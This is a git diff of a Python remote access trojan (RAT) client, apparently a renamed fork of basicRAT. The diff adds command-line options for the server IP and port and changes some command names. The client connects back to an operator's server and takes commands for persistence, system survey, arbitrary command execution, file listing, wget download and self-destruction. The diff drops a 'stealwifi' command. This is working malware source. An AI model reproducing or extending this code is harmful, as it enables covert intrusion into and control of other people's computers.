@@ -1,24 +1,17 @@
 #!/usr/bin/env python
 
 #
-# basicRAT client
-# https://github.com/vesche/basicRAT
+# RAT client
+# https://github.com/harshivara/RAT
 #
 
+import argparse
 import socket
-import subprocess
 import sys
 import time
 
 from core import crypto, persistence, scan, survey, toolkit
 
-
-# change these to suit your needs
-HOST = 'localhost'
-PORT = 1337
-
-# seconds to wait before client will attempt to reconnect
-CONN_TIMEOUT = 30
 
 # determine system platform
 if sys.platform.startswith('win'):
@@ -50,13 +43,10 @@ def client_loop(conn, dhkey):
             conn.close()
             toolkit.selfdestruct(PLAT)
 
-        elif cmd == 'goodbye':
+        elif cmd == 'quit':
             conn.shutdown(socket.SHUT_RDWR)
             conn.close()
             break
-
-        elif cmd == 'rekey':
-            dhkey = crypto.diffiehellman(conn)
 
         elif cmd == 'persistence':
             results = persistence.run(PLAT)
@@ -68,19 +58,16 @@ def client_loop(conn, dhkey):
             results = survey.run(PLAT)
 
         elif cmd == 'cat':
-            results = toolkit.cat(action, PLAT)
+            results = toolkit.cat(action)
 
         elif cmd == 'execute':
             results = toolkit.execute(action)
 
-        elif cmd == 'stealwifi':
-            results = toolkit.stealwifi(PLAT)
-
         elif cmd == 'ls':
-            results = toolkit.ls(action, PLAT)
+            results = toolkit.ls(action)
 
         elif cmd == 'pwd':
-            results = toolkit.pwd(PLAT)
+            results = toolkit.pwd()
 
         elif cmd == 'unzip':
             results = toolkit.unzip(action)
@@ -88,22 +75,39 @@ def client_loop(conn, dhkey):
         elif cmd == 'wget':
             results = toolkit.wget(action)
 
-        results += '\n{} completed.'.format(cmd)
+        results = results.rstrip() + '\n{} completed.'.format(cmd)
 
         conn.send(crypto.encrypt(results, dhkey))
 
 
+def get_parser():
+    parser = argparse.ArgumentParser(description='RAT client')
+    parser.add_argument('-i', '--ip', help='Server IP.',
+                        default='127.0.0.1', type=str)
+    parser.add_argument('-p', '--port', help='Port to connect on.',
+                        default=1337, type=int)
+    parser.add_argument('-t', '--timeout', help='timeout',
+                        default=30, type=int)
+    return parser
+
+
 def main():
+    parser = get_parser()
+    args = vars(parser.parse_args())
+    host = args['ip']
+    port = args['port']
+    timeout = args['timeout']
+
     exit_status = 0
-    
+
     while True:
         conn = socket.socket()
 
         try:
-            # attempt to connect to basicRAT server
-            conn.connect((HOST, PORT))
+            # attempt to connect to RAT server
+            conn.connect((host, port))
         except socket.error:
-            time.sleep(CONN_TIMEOUT)
+            time.sleep(timeout)
             continue
 
         dhkey = crypto.diffiehellman(conn)
